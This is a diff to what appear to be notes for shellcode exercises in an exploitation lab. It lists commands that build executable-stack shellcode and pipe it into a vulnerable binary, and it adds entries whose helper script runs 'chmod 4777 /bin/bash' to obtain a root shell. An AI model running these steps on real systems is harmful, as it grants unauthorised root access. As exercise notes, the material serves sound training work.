@@ -41,3 +41,14 @@
     - gcc -nostdlib -static -z execstack shellcode.105-59(2).s -o shellcode
     - objcopy --dump-section .text=shellcode-raw shellcode
     - (cat shellcode-raw;cat) | ./vuln
+
+9. shellcode.59(3).s
+
+    - echo -ne "#!/bin/bash\nchmod 4777 /bin/bash" > f
+    - all bytes are unique
+    - 14 bytes long
+
+10. shellcode.59(3).s
+
+    - echo -ne "#!/bin/bash\nchmod 4777 /bin/bash" > f
+    - 12 bytes long
